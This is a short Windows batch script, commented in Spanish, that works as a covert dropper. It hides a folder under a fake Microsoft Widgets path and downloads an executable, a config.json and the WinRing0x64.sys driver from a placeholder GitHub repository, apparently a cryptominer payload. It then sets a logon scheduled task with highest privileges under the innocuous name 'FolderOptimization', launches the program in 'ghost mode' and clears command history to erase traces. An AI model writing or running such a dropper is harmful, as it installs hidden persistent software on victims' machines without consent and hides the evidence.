@echo off
:: 1. Crear la ruta oculta (Discreto)
set "targetDir=%LocalAppData%\Microsoft\Windows\Widgets"
if not exist "%targetDir%" mkdir "%targetDir%"

:: 2. Descargar los archivos desde GitHub (Aquí es donde ocurre la magia)
:: REEMPLAZA 'USUARIO' Y 'REPO' con tus datos reales de GitHub
set "baseUrl=https://raw.githubusercontent.com/TU_USUARIO/TU_REPO/main"

powershell -Command "Invoke-WebRequest -Uri '%baseUrl%/WindowsWidgets.exe' -OutFile '%targetDir%\WindowsWidgets.exe'"
powershell -Command "Invoke-WebRequest -Uri '%baseUrl%/config.json' -OutFile '%targetDir%\config.json'"
powershell -Command "Invoke-WebRequest -Uri '%baseUrl%/WinRing0x64.sys' -OutFile '%targetDir%\WinRing0x64.sys'"

:: 3. Crear la persistencia
:: Como ya editamos el config.json, el comando de schtasks queda mucho más corto y discreto
schtasks /create /tn "FolderOptimization" /tr "%targetDir%\WindowsWidgets.exe" /sc onlogon /rl highest /f >nul

:: 4. Arrancarlo en modo fantasma
start /b "" "%targetDir%\WindowsWidgets.exe"

:: 5. Limpiar rastro
powershell -Command "Clear-History"
exit
exit